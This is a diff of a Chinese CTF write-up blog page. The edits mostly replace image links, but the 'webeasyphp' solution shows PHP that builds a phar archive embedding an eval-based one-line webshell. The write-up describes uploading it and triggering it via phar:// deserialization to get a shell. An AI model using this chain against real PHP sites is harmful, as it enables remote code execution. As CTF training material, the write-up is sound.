@@ -27,15 +27,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="webeasyphp这题刚开始学弟发现可以直接读uploads然后看到有个php文件直接上车成功 正式解一波 1234567891011121314151617181920212223242526&lt;?php error_reporting(E_ALL); $sandbox &#x3D; &amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;&amp;#x27; . md5($_SERVER[&amp;#x27;RE">
 <meta property="og:locale">
-<meta property="og:image" content="https://uploader.shimo.im/f/53neSGJBBfc3DrbQ.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/hOj89U2HK3Tm3NgP.png!thumbnail">
-<meta property="og:image" content="https://uploader.shimo.im/f/FaDvoC4iLquRnaxA.png!thumbnail">
+<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202101/25/234850-950013.png">
+<meta property="og:image" content="c:/Users/82524/AppData/Roaming/Typora/typora-user-images/image-20210125234907497.png">
+<meta property="og:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202101/25/234916-807320.png">
 <meta property="article:published_time" content="2020-12-26T14:49:34.000Z">
-<meta property="article:modified_time" content="2020-12-26T15:57:32.884Z">
+<meta property="article:modified_time" content="2021-01-25T15:49:18.617Z">
 <meta property="article:author" content="Dsil3nc3">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://uploader.shimo.im/f/53neSGJBBfc3DrbQ.png!thumbnail">
+<meta name="twitter:image" content="https://gitee.com/ess3nce/img_bed/raw/master/image/202101/25/234850-950013.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
     
@@ -435,7 +435,12 @@ height:50vh;
 <p>生成phar文件</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line">    <span class="keyword">public</span> $pattern;</span><br><span class="line">    <span class="keyword">public</span> $suffix;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = $content;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pattern = <span class="string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;suffix = <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">$o = <span class="keyword">new</span> Template(<span class="string">&quot;&lt;?php @eval(\$_POST[cmd]); ?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
 
-<p>生成phar.phar文件postman上传        <img src="https://uploader.shimo.im/f/53neSGJBBfc3DrbQ.png!thumbnail" alt="img">      然后phar协议读一下        <img src="https://uploader.shimo.im/f/hOj89U2HK3Tm3NgP.png!thumbnail" alt="img">       这样就生成了一句话,蚁剑直接读flag        <img src="https://uploader.shimo.im/f/FaDvoC4iLquRnaxA.png!thumbnail" alt="    ">      </p>
+<p>生成phar.phar文件postman上传</p>
+<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202101/25/234850-950013.png" alt="image-20210125234848983"></p>
+<p>然后phar协议读一下</p>
+<p><img src="C:\Users\82524\AppData\Roaming\Typora\typora-user-images\image-20210125234907497.png" alt="image-20210125234907497"></p>
+<p> 这样就生成了一句话,蚁剑直接读flag</p>
+<p><img src="https://gitee.com/ess3nce/img_bed/raw/master/image/202101/25/234916-807320.png" alt="image-20210125234915453"></p>
 <h3 id="easyjs"><a href="#easyjs" class="headerlink" title="easyjs"></a>easyjs</h3><p>网鼎杯半决赛原题</p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224207#h3-3">https://www.anquanke.com/post/id/224207#h3-3</a></p>
 
